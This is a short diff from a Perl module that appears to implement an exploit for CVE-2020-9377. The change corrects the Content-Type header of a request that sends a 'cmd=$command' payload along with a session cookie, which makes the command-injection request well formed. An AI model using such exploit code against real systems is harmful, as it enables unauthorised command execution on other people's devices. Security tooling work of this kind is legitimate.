@@ -26,7 +26,7 @@ package Spellbook::Advisory::CVE_2020_9377 {
             my $payload   = "cmd=$command";
             
             my $headers   = HTTP::Headers -> new (
-                'Content-Type' => "application/msx-www-form-urlencoded",
+                'Content-Type' => "application/x-www-form-urlencoded",
                 'Cookie' => "uid=$cookie"
             );
 
